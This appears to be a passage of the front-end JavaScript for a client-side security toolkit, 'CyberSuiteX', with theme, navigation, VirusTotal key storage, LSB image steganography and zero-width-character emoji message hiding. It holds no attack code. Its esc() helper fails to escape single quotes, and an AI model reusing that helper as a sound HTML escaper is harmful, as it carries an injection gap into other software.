'use strict';
// =============================================
// GLOBAL ERROR HANDLERS
// =============================================
window.addEventListener('error', e => {
  console.error('[CyberSuiteX] Uncaught error:', e.message, 'at', e.filename + ':' + e.lineno);
  if (e.message && e.message !== 'Script error.') {
    toast('Unexpected error: ' + e.message, 'error');
  }
});
window.addEventListener('unhandledrejection', e => {
  const msg = e.reason?.message || String(e.reason) || 'Unknown async error';
  console.error('[CyberSuiteX] Unhandled promise rejection:', msg);
  toast('Async error: ' + msg, 'error');
  e.preventDefault();
});

// =============================================
// THEME
// =============================================
const THEME_KEY='cybersuite-theme';
function getTheme(){return localStorage.getItem(THEME_KEY)||'dark';}
function applyTheme(t){
  document.documentElement.setAttribute('data-theme',t);
  const isDark=t==='dark';
  const icon=document.getElementById('themeIcon');
  const label=document.getElementById('themeLabel');
  if(icon)icon.className=isDark?'fas fa-moon':'fas fa-sun';
  if(label)label.textContent=isDark?'Light Mode':'Dark Mode';
  localStorage.setItem(THEME_KEY,t);
}
function toggleTheme(){applyTheme(getTheme()==='dark'?'light':'dark');toast('Switched to '+getTheme()+' mode','info');}
applyTheme(getTheme());
$on('themeToggleBtn','click',toggleTheme);
$on('mobileThemeBtn','click',toggleTheme);

// =============================================
// UTILITIES
// =============================================
const startTime=Date.now();
let totalOps=0,totalBytes=0;
const activityEntries=[];

// Named file-size limits (bytes) — single source of truth
const MAX_STEGO_MB   = 10;
const MAX_MALWARE_MB = 20;
const MAX_PCAP_MB    = 50;
const MAX_SHRED_MB   = 50;

// Safe DOM accessor — returns null silently instead of throwing
function $(id){return document.getElementById(id);}
function esc(str){return String(str).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/\'\'/g,'&#39;');}
function $on(id,ev,fn){const e=$(id);if(e)e.addEventListener(ev,fn);else console.warn('Missing element: #'+id);}
function $set(id,prop,val){const e=$(id);if(e)e[prop]=val;}
function $html(id,html){const e=$(id);if(e)e.innerHTML=html;}
function debounce(fn,ms){let t;return function(...args){clearTimeout(t);t=setTimeout(()=>fn.apply(this,args),ms);};}
// Module error boundary — isolates init failures so one broken module can't crash others
function safeInit(name,fn){try{fn();}catch(e){console.error('[CyberSuiteX] Module "'+name+'" failed to init:',e);}}

function toast(msg,type='info'){
  const c=document.getElementById('toastContainer');
  const icons={success:'fa-circle-check',error:'fa-circle-xmark',info:'fa-circle-info',warn:'fa-triangle-exclamation'};
  const el=document.createElement('div');
  el.className='toast toast-'+type;
  el.innerHTML='<i class="fas '+(icons[type]||icons.info)+'"></i><span>'+esc(msg)+'</span>';
  c.appendChild(el);
  setTimeout(()=>{el.classList.add('toast-exit');setTimeout(()=>el.remove(),300);},4000);
}

function copyText(t){
  if(navigator.clipboard&&window.isSecureContext){
    navigator.clipboard.writeText(t).then(()=>toast('Copied!','success')).catch(()=>fallbackCopy(t));
  } else { fallbackCopy(t); }
}
function fallbackCopy(t){
  const ta=document.createElement('textarea');
  ta.value=t;ta.style.cssText='position:fixed;top:-9999px;left:-9999px;opacity:0';
  document.body.appendChild(ta);ta.select();
  try{document.execCommand('copy');toast('Copied!','success');}
  catch{toast('Copy failed — please copy manually','error');}
  document.body.removeChild(ta);
}
function downloadBlob(name,blob){const a=document.createElement('a');a.href=URL.createObjectURL(blob);a.download=name;a.click();URL.revokeObjectURL(a.href);}
function downloadText(n,t){downloadBlob(n,new Blob([t],{type:'text/plain'}));}
function downloadCanvas(n,c){const a=document.createElement('a');a.href=c.toDataURL('image/png');a.download=n;a.click();}

function logActivity(msg){
  const now=new Date();
  const time=now.toTimeString().split(' ')[0];
  activityEntries.unshift({time,msg});
  if(activityEntries.length>60)activityEntries.pop();
  renderLog();
}
function renderLog(){
  const el=document.getElementById('activityLog');
  if(!el||!activityEntries.length)return;
  el.innerHTML=activityEntries.map(e=>'<div class="log-item"><span class="time">'+esc(e.time)+'</span><span class="msg" style="color:var(--muted)">'+esc(e.msg)+'</span></div>').join('');
}
function addStats(ops=1,bytes=0){totalOps+=ops;totalBytes+=bytes;}
function updateStats(){
  $set('statOps','textContent',totalOps);
  const f=totalBytes>=1048576?(totalBytes/1048576).toFixed(1)+'MB':totalBytes>=1024?(totalBytes/1024).toFixed(1)+'KB':totalBytes+'B';
  $set('statBytes','textContent',f);
  const s=Math.floor((Date.now()-startTime)/1000);
  $set('statUptime','textContent',s<60?s+'s':Math.floor(s/60)+'m '+(s%60)+'s');
}

function wordArrayToUint8Array(wa){
  const w=wa.words,s=wa.sigBytes,u=new Uint8Array(s);
  for(let i=0;i<s;i++)u[i]=(w[i>>>2]>>>(24-(i%4)*8))&0xff;
  return u;
}

function setupDropZone(zid,fid,onDrop){
  const z=document.getElementById(zid);
  const inp=document.getElementById(fid);
  if(!z||!inp)return;
  z.addEventListener('dragover',e=>{e.preventDefault();z.classList.add('drag-over');});
  z.addEventListener('dragleave',()=>z.classList.remove('drag-over'));
  z.addEventListener('drop',e=>{e.preventDefault();z.classList.remove('drag-over');if(e.dataTransfer.files[0])onDrop(e.dataTransfer.files[0]);});
  z.addEventListener('click',e=>{if(e.target.tagName!=='INPUT')inp.click();});
  inp.addEventListener('change',()=>{if(inp.files[0])onDrop(inp.files[0]);});
}

const _store=new Map();let _storeIdx=0;
function storeResult(val){const k=++_storeIdx;_store.set(k,val);return k;}
function getResult(k){return _store.get(k)||'';}

// =============================================
// MATRIX BACKGROUND
// =============================================
(function(){
  const canvas=document.getElementById('matrix-canvas');
  const ctx=canvas.getContext('2d');
  let w,h,columns,drops;
  const chars='ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*(){}|;:<>,.?/~αβγδεζηθλμπσφ';
  const fs=13;
  function resize(){w=canvas.width=window.innerWidth;h=canvas.height=window.innerHeight;columns=Math.floor(w/fs);drops=Array.from({length:columns},()=>Math.random()*h/fs|0);}
  resize();window.addEventListener('resize',resize);
  function draw(){
    ctx.fillStyle=getTheme()==='dark'?'rgba(6,10,19,0.07)':'rgba(240,244,248,0.09)';
    ctx.fillRect(0,0,w,h);
    ctx.fillStyle=getTheme()==='dark'?'#00ff88':'#00a855';
    ctx.font=fs+'px JetBrains Mono';
    for(let i=0;i<columns;i++){ctx.fillText(chars[Math.random()*chars.length|0],i*fs,drops[i]*fs);if(drops[i]*fs>h&&Math.random()>.975)drops[i]=0;drops[i]++;}
    requestAnimationFrame(draw);
  }
  if(!window.matchMedia('(prefers-reduced-motion: reduce)').matches)draw();
})();

// =============================================
// NAVIGATION
// =============================================
const PAGES=['dashboard','stego','emoji','crypto','wifi','packet','password','pwgen','malware','url','loganalyzer','metadata','shredder','apisetup'];

function navigateTo(page){
  if(!PAGES.includes(page))return;
  document.querySelectorAll('.page').forEach(p=>p.classList.remove('active'));
  document.getElementById('page-'+page).classList.add('active');
  document.querySelectorAll('.nav-item').forEach(n=>n.classList.remove('active'));
  const nav=document.querySelector('.nav-item[data-page="'+page+'"]');
  if(nav)nav.classList.add('active');
  document.getElementById('sidebar').classList.remove('open');
  document.getElementById('sidebarOverlay').classList.remove('open');
  window.scrollTo({top:0,behavior:'smooth'});
}

document.querySelectorAll('.nav-item').forEach(item=>item.addEventListener('click',()=>navigateTo(item.dataset.page)));
document.querySelectorAll('.tool-card[data-nav]').forEach(card=>card.addEventListener('click',()=>navigateTo(card.dataset.nav)));
$on('menuToggle','click',()=>{$('sidebar')?.classList.toggle('open');$('sidebarOverlay')?.classList.toggle('open');});
$on('sidebarOverlay','click',()=>{$('sidebar')?.classList.remove('open');$('sidebarOverlay')?.classList.remove('open');});

// =============================================
// API SETUP MODULE
// =============================================
const VT_KEY_STORAGE = 'vt-api-key';

// API Rate limiting — prevent hammering external APIs
const RateLimit = {
  _calls: {},
  check(key, limitMs) {
    const now = Date.now();
    const last = this._calls[key] || 0;
    if (now - last < limitMs) {
      const wait = Math.ceil((limitMs - (now - last)) / 1000);
      return { allowed: false, wait };
    }
    this._calls[key] = now;
    return { allowed: true };
  }
};

function getVtApiKey() { return localStorage.getItem(VT_KEY_STORAGE) || ''; }

function refreshApiSetupUI() {
  const key = getVtApiKey();
  const badge = document.getElementById('vtKeyBadge');
  const globalBadge = document.getElementById('vtGlobalBadge');
  const status = document.getElementById('apiSetupStatus');
  const inp = document.getElementById('apiSetupVtKey');
  const urlBanner = document.getElementById('urlVtStatusBanner');
  const urlBannerText = document.getElementById('urlVtBannerText');
  const malwareStatus = document.getElementById('malwareVtKeyStatus');

  if (key) {
    if(badge) badge.style.display = 'inline';
    if(globalBadge) { globalBadge.textContent = 'ACTIVE'; globalBadge.style.background = 'rgba(0,255,136,0.1)'; globalBadge.style.color = 'var(--accent)'; globalBadge.style.borderColor = 'rgba(0,255,136,0.3)'; }
    if(status) { status.innerHTML = '<i class="fas fa-check-circle" style="color:var(--accent)"></i> API key saved and active — VirusTotal scanning enabled'; status.style.borderColor = 'rgba(0,255,136,0.2)'; status.style.color = 'var(--accent)'; }
    if(inp) inp.value = key;
    if(urlBannerText) urlBannerText.innerHTML = '<i class="fas fa-check-circle" style="color:var(--accent)"></i> <span style="color:var(--accent)">VirusTotal API key active</span> — 70+ engines enabled';
    if(urlBanner) urlBanner.style.borderColor = 'rgba(0,255,136,0.2)';
    if(malwareStatus) { malwareStatus.innerHTML = '<i class="fas fa-check-circle" style="color:var(--accent)"></i> <span style="color:var(--accent)">VirusTotal key active</span> — scan will include VT hash lookup'; malwareStatus.style.borderColor = 'rgba(0,255,136,0.2)'; }
  } else {
    if(badge) badge.style.display = 'none';
    if(globalBadge) { globalBadge.textContent = 'NOT SET'; globalBadge.style.background = ''; globalBadge.style.color = 'var(--muted)'; globalBadge.style.borderColor = 'var(--border)'; }
    if(status) { status.innerHTML = '<i class="fas fa-circle-info"></i> No key saved — get a free key at <a href="https://www.virustotal.com/gui/join-us" target="_blank" style="color:var(--cyan)">virustotal.com</a>'; status.style.borderColor = 'var(--border)'; status.style.color = 'var(--muted)'; }
    if(inp) inp.value = '';
    if(urlBannerText) urlBannerText.innerHTML = 'No VirusTotal API key saved — <a href="#" class="nav-to-apisetup" style="color:var(--cyan)">set it up in API Setup</a>';
    if(urlBanner) urlBanner.style.borderColor = 'rgba(168,85,247,0.2)';
    if(malwareStatus) { malwareStatus.innerHTML = '<i class="fas fa-circle-info"></i> No VirusTotal API key — <a href="#" class="nav-to-apisetup" style="color:var(--cyan)">set up in API Setup</a> to enable VT scanning'; malwareStatus.style.borderColor = 'var(--border)'; }
  }

  // Stored data list
  const container = document.getElementById('apiSetupStoredData');
  if(container) {
    const items = [];
    if(localStorage.getItem(VT_KEY_STORAGE)) items.push('<div><span style="color:var(--accent)">✓</span> VirusTotal API Key</div>');
    if(localStorage.getItem('cybersuite-theme')) items.push('<div><span style="color:var(--accent)">✓</span> Theme preference</div>');
    if(!items.length) items.push('<div style="color:var(--muted)">— Nothing stored yet</div>');
    container.innerHTML = items.join('');
  }
}

// API Setup page event handlers
$on('apiSetupSaveBtn', 'click', () => {
  const key = document.getElementById('apiSetupVtKey').value.trim();
  if(!key) { toast('Please enter an API key','warn'); return; }
  localStorage.setItem(VT_KEY_STORAGE, key);
  refreshApiSetupUI();
  toast('VirusTotal API key saved!','success');
  logActivity('API Setup: VirusTotal key saved');
});

$on('apiSetupEyeBtn', 'click', function() {
  const inp = document.getElementById('apiSetupVtKey');
  const show = inp.type === 'password';
  inp.type = show ? 'text' : 'password';
  this.querySelector('i').className = 'fas ' + (show ? 'fa-eye-slash' : 'fa-eye');
});

$on('apiSetupClearBtn', 'click', () => {
  if(!confirm('Remove saved VirusTotal API key?')) return;
  localStorage.removeItem(VT_KEY_STORAGE);
  refreshApiSetupUI();
  toast('API key removed','info');
});

function clearAllApiData() {
  if(!confirm('Clear all stored data (API key, theme)?')) return;
  [VT_KEY_STORAGE, 'cybersuite-theme'].forEach(k => localStorage.removeItem(k));
  refreshApiSetupUI();
  toast('All data cleared','info');
  logActivity('API Setup: All data cleared');
}

// Init on load
refreshApiSetupUI();

// Event delegation — replaces all inline onclick="navigateTo('apisetup')" in innerHTML
document.addEventListener('click', e => {
  const a = e.target.closest('.nav-to-apisetup');
  if(a){ e.preventDefault(); navigateTo('apisetup'); }
});

// Wire clearAllApiDataBtn (replaces inline onclick in HTML)
$on('clearAllApiDataBtn', 'click', clearAllApiData);

// =============================================
// SESSION TIMER
// =============================================
setInterval(()=>{
  const s=Math.floor((Date.now()-startTime)/1000);
  const m=String(Math.floor(s/60)).padStart(2,'0');
  const sc=String(s%60).padStart(2,'0');
  $set('sessionTimer','textContent','Session: '+m+':'+sc);
  updateStats();
},1000);

// =============================================
// TYPING EFFECT
// =============================================
(function(){
  const text='12 modules · VirusTotal URL scanning (70+ engines) · Fixed malware scanner · Real RSA · 25+ crypto algorithms — fully client-side.';
  const el=document.getElementById('typingText');
  if(!el)return;
  let i=0;
  function type(){if(i<=text.length){el.innerHTML=text.slice(0,i)+'<span class="typing-cursor"></span>';i++;setTimeout(type,18);}}
  type();
})();

// =============================================
// STEGANOGRAPHY MODULE
// =============================================
// Library availability guards — show visible banner and disable affected UI
(function checkLibraries(){
  const missing=[];
  if(typeof CryptoJS==='undefined')missing.push('CryptoJS (AES/SHA-1 unavailable)');
  if(typeof pako==='undefined')missing.push('pako (compression unavailable)');
  if(!missing.length)return;
  const banner=document.createElement('div');
  banner.className='toast toast-warn';
  banner.style.cssText='position:fixed;top:16px;left:50%;transform:translateX(-50%);z-index:9999;max-width:520px;pointer-events:auto;cursor:pointer';
  banner.title='Click to dismiss';
  banner.innerHTML='<i class="fas fa-triangle-exclamation"></i><span><strong>Library load failed:</strong> '+esc(missing.join(', '))+'. Reload or check your connection.</span>';
  banner.addEventListener('click',()=>banner.remove());
  document.body.appendChild(banner);
  if(typeof CryptoJS==='undefined'){
    ['cryptoEncBtn','cryptoDecBtn','hashBtn','stegoEncBtn','stegoDecBtn'].forEach(id=>{
      const el=document.getElementById(id);
      if(el){el.disabled=true;el.title='CryptoJS not loaded — reload the page';}
    });
  }
  missing.forEach(m=>console.error('[CyberSuiteX] Missing dependency:',m));
})();

const Stego={
  encode(imgData,msg){
    const encoder=new TextEncoder();
    const msgBytes=encoder.encode(msg);
    const msgLen=msgBytes.length;
    // Pre-allocate exact bit count to avoid O(n²) string growth
    const totalBits=32+msgLen*8;
    const bits=new Uint8Array(totalBits);
    for(let i=31;i>=0;i--)bits[31-i]=(msgLen>>i)&1;
    for(let i=0;i<msgLen;i++)for(let b=7;b>=0;b--)bits[32+i*8+(7-b)]=(msgBytes[i]>>b)&1;
    const maxBits=Math.floor((imgData.data.length/4)*3);
    if(totalBits>maxBits)throw new Error('Message too large. Max ~'+Math.floor((maxBits-32)/8)+' bytes for this image.');
    const px=imgData.data;let bitIdx=0;
    for(let i=0;i<px.length&&bitIdx<totalBits;i++){if(i%4===3)continue;px[i]=(px[i]&0xFE)|bits[bitIdx];bitIdx++;}
    return imgData;
  },
  decode(imgData){
    const px=imgData.data;
    let lenBits='',channelCount=0;
    for(let i=0;i<px.length&&channelCount<32;i++){if(i%4===3)continue;lenBits+=(px[i]&1).toString();channelCount++;}
    const msgLen=parseInt(lenBits,2);
    if(msgLen<=0||msgLen>10000000)throw new Error('No hidden message found (invalid length header).');
    const maxBits=Math.floor((imgData.data.length/4)*3)-32;
    if(msgLen*8>maxBits)throw new Error('Message length exceeds image capacity.');
    let msgBits='',skipped=0,collected=0;
    for(let i=0;i<px.length&&collected<msgLen*8;i++){if(i%4===3)continue;if(skipped<32){skipped++;continue;}msgBits+=(px[i]&1).toString();collected++;}
    const msgBytes=new Uint8Array(msgLen);
    for(let i=0;i<msgLen;i++)msgBytes[i]=parseInt(msgBits.slice(i*8,i*8+8),2);
    return new TextDecoder().decode(msgBytes);
  }
};

let stegoEncImgData=null,stegoEncCanvas=null,stegoDecImgData=null;

function loadImageFromFile(f){
  return new Promise((res,rej)=>{
    if(f.size>MAX_STEGO_MB*1024*1024)return rej(new Error('Max '+MAX_STEGO_MB+'MB'));
    if(!f.type.match(/image\/(png|jpe?g)/))return rej(new Error('PNG/JPG only'));
    const r=new FileReader();
    r.onload=e=>{const img=new Image();img.onload=()=>res(img);img.onerror=()=>rej(new Error('Load failed'));img.src=e.target.result;};
    r.onerror=()=>rej(new Error('Read failed'));
    r.readAsDataURL(f);
  });
}
function imageToCanvas(img){
  const c=document.createElement('canvas');
  c.width=img.naturalWidth;c.height=img.naturalHeight;
  c.getContext('2d').drawImage(img,0,0);
  return c;
}

$on('stegoTabs', 'click',e=>{
  const btn=e.target.closest('[data-stego-tab]');if(!btn)return;
  document.querySelectorAll('#stegoTabs .tab').forEach(t=>t.classList.remove('active'));
  btn.classList.add('active');
  const tab=btn.dataset.stegoTab;
  document.getElementById('stegoEncodeTab').style.display=tab==='encode'?'block':'none';
  document.getElementById('stegoDecodeTab').style.display=tab==='decode'?'block':'none';
});

$on('clearStegoEncBtn', 'click',()=>{
  stegoEncImgData=null;stegoEncCanvas=null;
  document.getElementById('stegoEncPreview').style.display='none';
  document.getElementById('stegoEncImg').src='';
  document.getElementById('stegoEncInfo').textContent='';
  document.getElementById('stegoCapacity').textContent='';
  document.getElementById('stegoEncFile').value='';
  document.getElementById('stegoEncMsg').value='';
  document.getElementById('stegoEncResult').innerHTML='<p class="text-sm" style="color:var(--muted);opacity:.5">Encoded image will appear here</p>';
  document.getElementById('stegoEncBtn').disabled=true;
  toast('Cleared','info');
});
$on('clearStegoMsgBtn', 'click',()=>{document.getElementById('stegoEncMsg').value='';});
$on('clearStegoDecBtn', 'click',()=>{
  stegoDecImgData=null;
  document.getElementById('stegoDecPreview').style.display='none';
  document.getElementById('stegoDecImg').src='';
  document.getElementById('stegoDecFile').value='';
  document.getElementById('stegoDecResult').innerHTML='<p class="text-sm" style="color:var(--muted);opacity:.5">Decoded message will appear here</p>';
  document.getElementById('stegoDecBtn').disabled=true;
  toast('Cleared','info');
});

setupDropZone('stegoEncDropZone','stegoEncFile',async f=>{
  try{
    const img=await loadImageFromFile(f);
    stegoEncCanvas=imageToCanvas(img);
    stegoEncImgData=stegoEncCanvas.getContext('2d').getImageData(0,0,stegoEncCanvas.width,stegoEncCanvas.height);
    document.getElementById('stegoEncImg').src=stegoEncCanvas.toDataURL();
    document.getElementById('stegoEncPreview').style.display='block';
    const maxBytes=Math.floor((stegoEncImgData.data.length/4*3-32)/8);
    document.getElementById('stegoEncInfo').textContent=stegoEncCanvas.width+'×'+stegoEncCanvas.height+' · Max: '+maxBytes.toLocaleString()+' bytes';
    document.getElementById('stegoCapacity').textContent='Capacity: '+maxBytes.toLocaleString()+' bytes';
    document.getElementById('stegoEncBtn').disabled=false;
    if(f.type==='image/jpeg')toast('JPEG loaded → converted to PNG for lossless LSB encoding. Save the output PNG — re-loading a JPEG will destroy LSB data.','warn');
  }catch(e){toast(e.message,'error');}
});

$on('stegoEncMsg', 'input',debounce(function(){
  if(!stegoEncImgData)return;
  const maxBytes=Math.floor((stegoEncImgData.data.length/4*3-32)/8);
  const u=new TextEncoder().encode(this.value).length;
  document.getElementById('stegoCapacity').textContent='Using '+u.toLocaleString()+' / '+maxBytes.toLocaleString()+' bytes';
  document.getElementById('stegoCapacity').style.color=u>maxBytes?'var(--danger)':'var(--accent)';
},150));

$on('stegoEncBtn', 'click',async()=>{
  const msg=document.getElementById('stegoEncMsg').value;
  if(!msg.trim())return toast('Enter a message','warn');
  if(!stegoEncImgData)return toast('Upload an image first','warn');
  const btn=document.getElementById('stegoEncBtn');
  btn.disabled=true;btn.innerHTML='<span class="spinner"></span> Encoding...';
  await new Promise(r=>setTimeout(r,0)); // yield to UI thread
  try{
    const cloned=new ImageData(new Uint8ClampedArray(stegoEncImgData.data),stegoEncImgData.width,stegoEncImgData.height);
    Stego.encode(cloned,msg);
    const c=document.createElement('canvas');
    c.width=cloned.width;c.height=cloned.height;
    c.getContext('2d').putImageData(cloned,0,0);
    const du=c.toDataURL('image/png');
    const rd=document.getElementById('stegoEncResult');
    rd.style.display='block';
    rd.innerHTML='<div style="width:100%"><div class="preview-container mb-2"><img src="'+du+'" alt="Encoded"></div><div class="flex gap-2"><button class="btn btn-primary btn-sm" id="stegoDownloadBtn"><i class="fas fa-download"></i> Download PNG</button></div></div>';
    $on('stegoDownloadBtn', 'click',()=>downloadCanvas('stego_encoded.png',c));
    addStats(1,new TextEncoder().encode(msg).length);
    logActivity('Stego: Encoded '+new TextEncoder().encode(msg).length+' bytes into image');
    toast('Message encoded!','success');
  }catch(e){toast(e.message,'error');}
  finally{btn.disabled=false;btn.innerHTML='<i class="fas fa-lock"></i> Encode Message';}
});

setupDropZone('stegoDecDropZone','stegoDecFile',async f=>{
  try{
    if(f.type==='image/jpeg'||f.name.match(/\.jpe?g$/i)){
      return toast('JPEG cannot be decoded — LSB data is destroyed by JPEG compression. Only decode PNG files that were encoded by this tool.','error');
    }
    const img=await loadImageFromFile(f);
    document.getElementById('stegoDecImg').src=img.src;
    document.getElementById('stegoDecPreview').style.display='block';
    const c=imageToCanvas(img);
    stegoDecImgData=c.getContext('2d').getImageData(0,0,c.width,c.height);
    document.getElementById('stegoDecBtn').disabled=false;
    toast('Image loaded: '+c.width+'×'+c.height,'info');
  }catch(e){toast(e.message,'error');}
});

$on('stegoDecBtn', 'click',()=>{
  if(!stegoDecImgData)return toast('Upload an image first','warn');
  try{
    const msg=Stego.decode(stegoDecImgData);
    const escaped=msg.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
    const k=storeResult(msg);
    const rd=document.getElementById('stegoDecResult');
    rd.innerHTML='<div style="width:100%"><p style="color:var(--accent);margin-bottom:8px;font-weight:700"><i class="fas fa-check-circle"></i> Message found ('+new TextEncoder().encode(msg).length+' bytes):</p><div class="result-box" style="white-space:pre-wrap;word-break:break-word">'+escaped+'</div><div class="flex gap-2 mt-2"><button class="btn btn-secondary btn-sm" id="stegoDecCopyBtn"><i class="fas fa-copy"></i> Copy</button></div></div>';
    $on('stegoDecCopyBtn', 'click',()=>copyText(getResult(k)));
    addStats(1);logActivity('Stego: Decoded '+new TextEncoder().encode(msg).length+' bytes');toast('Decoded!','success');
  }catch(e){
    document.getElementById('stegoDecResult').innerHTML='<div style="padding:20px;text-align:center"><p style="color:var(--danger);font-weight:700"><i class="fas fa-circle-xmark"></i> '+esc(e.message)+'</p></div>';
    toast(e.message,'error');
  }
});

// =============================================
// PHANTOM EMOJI
// =============================================
const EMOJI_CATS={
  'Smileys':['😀','😂','😎','🤔','😏','🥺','😈','🤡','💀','👻','🤖','👽','🥶','🥵'],
  'Gestures':['👋','👍','👎','👌','✌️','🤞','🤟','🤘','👊','🤝','🙏','💪','🫡'],
  'Animals':['🐶','🐱','🦊','🐻','🐼','🦁','🐸','🐵','🐧','🦋','🐙','🦈','🐉','🦄'],
  'Objects':['💡','🔑','💎','🔒','💣','🛡️','🔮','📱','💻','🔍','🧪','🧲'],
  'Symbols':['❤️','💔','⚡','🔥','💯','⚠️','✅','❌','⭐','🌙','☀️','🌈']
};
const ZW_0='\u200B',ZW_1='\u200C';
let selectedEmojis=[];

function renderEmojiGrid(filter=''){
  const g=document.getElementById('emojiGrid');g.innerHTML='';
  const lf=filter.toLowerCase();
  for(const[cat,emojis]of Object.entries(EMOJI_CATS)){
    emojis.filter(()=>!filter||cat.toLowerCase().includes(lf)).forEach(e=>{
      const c=document.createElement('div');
      c.className='emoji-cell'+(selectedEmojis.includes(e)?' selected':'');
      c.textContent=e;
      c.addEventListener('click',()=>{
        const i=selectedEmojis.indexOf(e);
        if(i>=0)selectedEmojis.splice(i,1);else selectedEmojis.push(e);
        c.classList.toggle('selected');renderSelectedEmojis();
      });
      g.appendChild(c);
    });
  }
}

function renderSelectedEmojis(){
  const el=document.getElementById('selectedEmojis');
  if(!selectedEmojis.length){el.innerHTML='<span class="text-xs" style="color:var(--muted)">No emojis selected</span>';return;}
  el.innerHTML=selectedEmojis.map((e,i)=>'<span style="display:inline-flex;align-items:center;gap:3px;background:var(--nav-active);border:1px solid var(--border);border-radius:5px;padding:2px 7px;font-size:15px;cursor:pointer" data-emoji-remove="'+i+'">'+e+'<span style="font-size:9px;color:var(--danger)">×</span></span>').join('');
  el.querySelectorAll('[data-emoji-remove]').forEach(span=>{
    span.addEventListener('click',()=>{selectedEmojis.splice(parseInt(span.dataset.emojiRemove),1);renderEmojiGrid(document.getElementById('emojiSearch').value);renderSelectedEmojis();});
  });
}

renderEmojiGrid();
$on('emojiSearch', 'input',function(){renderEmojiGrid(this.value);});

$on('emojiTabs', 'click',e=>{
  const btn=e.target.closest('[data-emoji-tab]');if(!btn)return;
  document.querySelectorAll('#emojiTabs .tab').forEach(t=>t.classList.remove('active'));
  btn.classList.add('active');
  const tab=btn.dataset.emojiTab;
  document.getElementById('emojiEncodeTab').style.display=tab==='encode'?'block':'none';
  document.getElementById('emojiDecodeTab').style.display=tab==='decode'?'block':'none';
});

$on('emojiAesToggle', 'click',function(){
  this.classList.toggle('active');
  document.getElementById('emojiAesField').style.display=this.classList.contains('active')?'block':'none';
});
$on('emojiDecAesToggle', 'click',function(){
  this.classList.toggle('active');
  document.getElementById('emojiDecAesField').style.display=this.classList.contains('active')?'block':'none';
});

$on('clearEmojiEncBtn', 'click',()=>{
  selectedEmojis=[];renderEmojiGrid('');renderSelectedEmojis();
  document.getElementById('emojiMsg').value='';document.getElementById('emojiPassword').value='';
  document.getElementById('emojiSearch').value='';
  document.getElementById('emojiAesToggle').classList.remove('active');
  document.getElementById('emojiAesField').style.display='none';
  document.getElementById('emojiEncResult').innerHTML='<p class="text-sm" style="color:var(--muted);opacity:.5">Encoded emojis will appear here</p>';
  toast('Cleared','info');
});
$on('clearEmojiDecBtn', 'click',()=>{
  document.getElementById('emojiDecInput').value='';document.getElementById('emojiDecPassword').value='';
  document.getElementById('emojiDecAesToggle').classList.remove('active');
  document.getElementById('emojiDecAesField').style.display='none';
  document.getElementById('emojiDecResult').innerHTML='<p class="text-sm" style="color:var(--muted);opacity:.5">Decoded message will appear here</p>';
  toast('Cleared','info');
});
$on('clearEmojiMsgBtn', 'click',()=>{document.getElementById('emojiMsg').value='';});

$on('emojiEncBtn', 'click',()=>{
  const msg=document.getElementById('emojiMsg').value;
  if(!msg.trim())return toast('Enter a message','warn');
  if(!selectedEmojis.length)return toast('Select emojis','warn');
  const useAes=document.getElementById('emojiAesToggle').classList.contains('active');
  const pw=useAes?document.getElementById('emojiPassword').value:'';
  if(useAes&&!pw)return toast('Enter password','warn');
  const mode=document.getElementById('emojiMode').value;
  try{
    if(typeof CryptoJS==='undefined')throw new Error('CryptoJS library not loaded — check your internet connection');
    const payload=CryptoJS.SHA256(msg).toString()+'::CSX::'+msg;
    if(typeof pako==='undefined')throw new Error('pako library not loaded — check your internet connection');
    const comp=pako.deflate(new TextEncoder().encode(payload));
    let bs='';
    if(useAes){
      const wa=CryptoJS.lib.WordArray.create(comp);
      const enc=CryptoJS.AES.encrypt(wa,pw);
      const b64=enc.toString();
      for(let i=0;i<b64.length;i++)bs+=b64.charCodeAt(i).toString(2).padStart(8,'0');
    }else{
      for(const b of comp)bs+=b.toString(2).padStart(8,'0');
    }
    let zw='';for(const bit of bs)zw+=bit==='0'?ZW_0:ZW_1;
    // Auto-mode: use single-emoji carrier only when payload fits comfortably in one
    // (≤ 400 ZW chars per emoji is a safe legibility threshold; scale by emoji count)
    const zwPerEmoji=Math.ceil(zw.length/Math.max(selectedEmojis.length,1));
    const autoUseSingle=zwPerEmoji<=400||selectedEmojis.length===1;
    let result='';
    if(mode==='single'||(mode==='auto'&&autoUseSingle)){result=selectedEmojis[0]+zw;}
    else{
      const es=selectedEmojis.slice();const cs=Math.ceil(zw.length/Math.max(es.length,1));
      for(let i=0;i<es.length;i++)result+=es[i]+zw.slice(i*cs,(i+1)*cs);
    }
    const k=storeResult(result);
    const rd=document.getElementById('emojiEncResult');rd.style.display='block';
    rd.innerHTML='<div style="width:100%"><p style="color:var(--accent);font-weight:700;margin-bottom:6px"><i class="fas fa-check-circle"></i> Encoded</p><div class="result-box" style="user-select:all">'+result+'</div><div class="flex gap-2 mt-2"><button class="btn btn-secondary btn-sm" id="emojiEncCopyBtn"><i class="fas fa-copy"></i> Copy</button></div></div>';
    $on('emojiEncCopyBtn', 'click',()=>copyText(getResult(k)));
    addStats(1,new TextEncoder().encode(msg).length);logActivity('Emoji: Encoded '+new TextEncoder().encode(msg).length+' bytes');toast('Encoded!','success');
  }catch(e){toast('Error: '+e.message,'error');}
});

$on('emojiDecBtn', 'click',()=>{
  const input=document.getElementById('emojiDecInput').value;
  if(!input.trim())return toast('Paste encoded emojis','warn');
  const useAes=document.getElementById('emojiDecAesToggle').classList.contains('active');
  const pw=useAes?document.getElementById('emojiDecPassword').value:'';
  if(useAes&&!pw)return toast('Enter password','warn');
  try{
    const zw=input.replace(/[^\u200B\u200C]/g,'');
    if(!zw.length)throw new Error('No zero-width chars found');
    let binary='';for(const c of zw)binary+=c===ZW_0?'0':'1';
    let decompressed;
    if(useAes){
      let b64='';
      for(let i=0;i<binary.length;i+=8){const byte=binary.slice(i,i+8);if(byte.length===8)b64+=String.fromCharCode(parseInt(byte,2));}
      const dec=CryptoJS.AES.decrypt(b64,pw);
      if(dec.sigBytes<=0)throw new Error('Decryption failed — wrong password');
      try{decompressed=pako.inflate(wordArrayToUint8Array(dec),{to:'string'});}
      catch(pe){throw new Error('Decompression failed — data may be corrupted or wrong password');}
    }else{
      const bytes=[];
      for(let i=0;i<binary.length;i+=8){const byte=binary.slice(i,i+8);if(byte.length===8)bytes.push(parseInt(byte,2));}
      try{decompressed=pako.inflate(new Uint8Array(bytes),{to:'string'});}
      catch(pe){throw new Error('Decompression failed — data may be corrupted');}
    }
